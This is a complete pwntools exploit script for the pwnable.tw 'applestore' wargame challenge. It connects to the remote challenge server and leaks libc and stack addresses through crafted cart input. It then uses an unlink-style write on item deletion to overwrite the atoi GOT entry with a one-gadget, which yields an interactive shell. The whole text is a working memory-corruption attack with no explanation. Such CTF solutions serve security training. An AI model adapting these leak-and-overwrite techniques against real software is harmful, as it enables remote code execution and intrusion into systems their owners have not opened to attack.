#Exploit for pwnable.tw/applestore
from pwn import *
#target = process('./applestore')
target = remote('chall.pwnable.tw', 10104)
elf = ELF('./applestore')
libc = ELF('./libc_32.so.6')
#context.log_level = "DEBUG"

def sa(s, d):
	target.sendafter(s, d)
	
def add(device):
	sa("> ", "2")
	sa("> ", str(device))

def rem(item_num):
	sa("> ", "3")
	sa("> ", str(item_num))
	
def cart(confirmation = "y"):
	sa("> ", "4")
	sa("> ", confirmation)

def checkout(confirmation = "y"):
	sa("> ", "5")
	sa("> ", confirmation)

'''
$199 -> 1, 5 	----> 16 in numbers
$299 -> 2
$399 -> 4	----> 10 in numbers
$499 -> 3
'''

for i in range(16):
	add(1)
for i in range(10):
	add(4)
checkout()

cart("yy" + p32(elf.got['read']) + p32(0) + p32(0))
target.recvuntil("27: ")
libc_base = u32(target.recv(4)) - libc.sym['read']
log.info("LIBC Base: " + hex(libc_base))

cart("yy" + p32(libc_base + libc.sym['environ']) + p32(0) + p32(0))
target.recvuntil("27: ")
environ = u32(target.recv(4))
log.info("environ:   " + hex(environ))

gadgets = [0x3a819, 0x5f065, 0x5f066]
thank_you = p32(0x08049068)
del_saved_ebp = environ - (0xffffd1bc - 0xffffd0b8)
got_address_end = elf.got['atoi']
rem("27" + thank_you + p32(0) + p32(del_saved_ebp - 4 - 0x8) + p32(got_address_end + 0x2c - 0xc))

target.send("A"*2 + p32(libc_base + gadgets[0]))
#target.send("A"*2 + p32(libc_base + libc.sym['system']) + p32(0x08048c69) + p32(libc_base + libc.search("/bin/sh\x00").next()))
target.recvuntil("> ")
log.success("Enjoy your shell!!!")
target.interactive()
